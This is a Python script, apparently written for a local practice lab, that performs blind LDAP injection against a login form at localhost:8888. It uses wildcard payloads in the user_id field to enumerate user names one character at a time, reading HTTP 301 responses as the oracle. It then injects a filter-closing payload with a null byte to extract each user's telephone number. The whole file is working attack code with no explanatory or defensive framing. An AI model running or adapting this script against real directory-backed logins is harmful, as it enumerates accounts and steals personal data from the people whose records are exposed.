#!/usr/bin/python3

from pwn import *
import sys, signal, time, requests, pdb
import string

def def_handler(sig, frame):
    print("\n\n[+] Exiting...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Global Variables
main_url = "http://localhost:8888/"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

def initial_users():
    characters = string.ascii_lowercase
    initial_users = []
    
    for character in characters:
        post_data = 'user_id={}*&password=*&login=1&submit=Submit'.format(character)
        r = requests.post(main_url, headers=headers, data=post_data, allow_redirects=False)

        if r.status_code == 301:
            initial_users.append(character)

    return initial_users

def getUsers(initial_users):
    characters = string.ascii_lowercase + string.digits
    users = []

    for initial_user in initial_users:
        user = initial_user

        for i in range(0, 15):
            for character in characters:
                post_data = 'user_id={}{}*&password=*&login=1&submit=Submit'.format(user, character)
                r = requests.post(main_url, headers=headers, data=post_data, allow_redirects=False)

                if r.status_code == 301:
                    user += character 
                    break
        
        users.append(user)
    
    print("\n")   
    for user in users:
        log.info('Valid user found: %s' % user)
    print("\n")

    return users

def getTelephoneNumber(users):
    characters = string.digits
    telephone_numbers = []

    p1 = log.progress("Getting phone numbers from local LDAP")

    p1.status("Initiating Brute Force")

    p2 = log.progress("Obtaining Phone Number")

    for user in users:
        telf = ''

        for i in range(0, 9):
            for character in characters:
                post_data = 'user_id={})(telephoneNumber={}{}*))%00&password=testing&login=1&submit=Submit'.format(user, telf, character)
                r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)

                p1.status("[+] Getting phone number for user: %s | %s" % (user, post_data))

                if r.status_code == 301:
                    telf += character
                    p2.status("Phone Number: %s" % telf)
                    break

        telephone_numbers.append(telf)

    p2.success("Obtained numbers are: %s " % telephone_numbers)

if __name__ == "__main__":
    initial_users = initial_users()
    getUsers = getUsers(initial_users)
    getTelephoneNumber = getTelephoneNumber(getUsers)
